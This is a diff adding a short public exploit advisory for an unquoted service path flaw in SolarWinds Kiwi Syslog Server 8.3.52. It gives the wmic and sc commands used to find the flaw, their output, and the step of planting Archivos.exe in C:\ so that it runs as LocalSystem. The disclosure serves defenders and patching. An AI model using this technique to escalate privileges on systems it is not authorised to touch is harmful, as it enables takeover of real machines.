@@ -1,0 +1,36 @@
+# Exploit Title: SolarWinds Kiwi Syslog Server 8.3.52 - 'Kiwi Syslog Server' Unquoted Service Path
+# Date: 2019-11-08
+# Exploit Author: Carlos A Garcia R
+# Vendor Homepage: https://www.kiwisyslog.com/
+# Software Link: https://www.kiwisyslog.com/downloads
+# Version: 8.3.52
+# Tested on: Windows XP Professional Service Pack 3
+
+# Description:
+# SolarWinds Kiwi Syslog Server 8.3.52 is an affordable software to manage syslog messages, SNMP traps, and Windows event logs
+
+# PoC:
+
+# C:\>wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+Kiwi Syslog Server	Kiwi Syslog Server	C:\Archivos de programa\Syslogd\Syslogd_Service.exe	Auto
+
+# C:\>sc qc "Kiwi Syslog Server"
+[SC] GetServiceConfig SUCCESS
+
+SERVICE_NAME: Kiwi Syslog Server
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Archivos de programa\Syslogd\Syslogd_Service.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Kiwi Syslog Server
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+ 
+# Exploit
+Using the BINARY_PATH_NAME listed above, an executable named "Archivos.exe" 
+could be placed in "C:\", and it would be executed as the Local System user 
+next time the service was restarted.
